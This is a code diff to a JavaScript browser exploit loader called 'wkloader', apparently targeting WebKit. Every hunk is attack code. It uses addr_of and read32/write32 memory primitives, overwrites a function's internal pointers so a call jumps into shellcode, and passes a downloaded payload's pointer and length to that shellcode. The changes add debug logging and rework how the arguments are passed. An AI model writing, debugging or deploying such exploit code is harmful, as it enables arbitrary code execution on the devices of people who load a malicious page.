@@ -54,7 +54,9 @@ wkloader.download = function(path) {
         var code = payload.charCodeAt(i);
         bytes[i] = code & 0xff;
     }
-    return new Uint32Array(bytes.buffer);
+    var u32 = new Uint32Array(bytes.buffer);
+    wkloader.log("downloaded " + path + " first=" + wkloader.hex32(u32[0]) + " len=" + u32.length);
+    return u32;
 }
 
 wkloader.f64_to_u32 = function(value) {
@@ -278,6 +280,12 @@ wkloader.exec = function(target) {
 
     var call_func_addr = wkloader.addr_of(call_func);
     var target_ptr = wkloader.read32(wkloader.addr_of(target) + 0x10);
+    wkloader.target = target;
+    wkloader.argbuf = new Uint32Array(2);
+    wkloader.argbuf[0] = target_ptr;
+    wkloader.argbuf[1] = target.length * 4;
+    var argptr = wkloader.read32(wkloader.addr_of(wkloader.argbuf) + 0x10);
+    wkloader.log("target[0]=" + wkloader.hex32(target[0]) + " argptr=" + wkloader.hex32(argptr) + " args=" + wkloader.hex32(wkloader.read32(argptr)) + "/" + wkloader.hex32(wkloader.read32(argptr+4)));
 
     wkloader.write32(call_func_addr, call_func_addr+0x4);
     wkloader.write32(call_func_addr+0x4, call_func_addr+0x4);
@@ -293,8 +301,8 @@ wkloader.exec = function(target) {
         wkloader.write32(call_func_addr+0x34, call_func_addr-0x14);
     }
 
-    wkloader.write32(shellcode-0x4, target_ptr);
-    wkloader.write32(shellcode-0x8, target.length * 4);
+    wkloader.write32(shellcode-0x4, argptr);
+    wkloader.log("arg check: " + wkloader.hex32(wkloader.read32(shellcode-0x4)));
     wkloader.log("about to call shellcode=" + wkloader.hex32(shellcode) + " target_ptr=" + wkloader.hex32(target_ptr));
     var r = call_func();
     wkloader.log("shellcode returned " + r);
